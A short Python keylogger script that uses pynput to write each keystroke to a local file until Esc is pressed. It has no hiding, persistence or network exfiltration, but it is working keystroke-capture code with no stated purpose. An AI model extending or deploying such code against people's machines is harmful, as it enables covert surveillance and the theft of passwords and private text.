from pynput import keyboard

log_file = open("key_log.txt", "a")

def on_press(key):
    try:
        log_file.write(f'{key.char}')
    except AttributeError:
        log_file.write(f'[{key.name}]')  
    log_file.flush()  

def on_release(key):
    if key == keyboard.Key.esc:
        log_file.close()
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
